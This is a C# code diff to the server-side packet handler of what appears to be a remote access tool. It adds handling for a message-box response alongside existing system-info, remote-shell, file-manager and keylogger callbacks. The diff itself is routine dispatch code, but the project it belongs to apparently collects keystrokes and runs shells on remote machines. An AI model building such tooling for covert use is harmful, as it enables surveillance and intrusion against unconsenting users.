@@ -13,8 +13,9 @@ namespace Server.Networking
         private readonly Action<KeyLoggerEvent>? _onKeyLoggerEvent;
         private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
         private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
+        private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
 
-        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
+        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<MessageBoxResponse> onMessageBoxResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
@@ -22,6 +23,7 @@ namespace Server.Networking
             _onKeyLoggerEvent = onKeyLoggerEvent;
             _onKeyLoggerBatch = onKeyLoggerBatch;
             _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
+            _onMessageBoxResponse = onMessageBoxResponse;
         }
 
         public void HandleLine(string json)
@@ -70,7 +72,13 @@ namespace Server.Networking
                         var klCombo = JsonHelper.Deserialize<KeyLoggerComboEvent>(json);
                         if (klCombo != null && _onKeyLoggerComboEvent != null) _onKeyLoggerComboEvent(klCombo);
                         break;
-
+                    case PacketType.MessageBoxResponse:
+                        var msgResq = JsonHelper.Deserialize<MessageBoxResponse>(json);
+                        if (msgResq != null)
+                        {
+                            _onMessageBoxResponse(msgResq);
+                        }
+                        break;
                     default:
                         break;
                 }
